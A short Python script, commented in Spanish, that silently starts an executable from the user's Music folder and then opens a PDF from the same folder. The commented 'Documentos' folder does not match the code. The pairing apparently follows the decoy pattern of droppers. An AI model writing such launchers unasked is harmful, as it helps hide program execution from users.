import os
import subprocess

def main():
    # Obtiene la ruta del directorio "Documentos" en Windows
    documents_dir = os.path.join(os.path.expanduser("~"), "Music")

    # Construye las rutas absolutas de los archivos
    pdf_file = os.path.join(documents_dir, "sockets.pdf")
    exe_file = os.path.join(documents_dir, "programa.exe")

    # Ejecuta el archivo ejecutable
    subprocess.Popen([exe_file], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Abre el archivo PDF
    if os.name == "nt":  # Windows
        os.startfile(pdf_file)


if __name__ == "__main__":
    main()
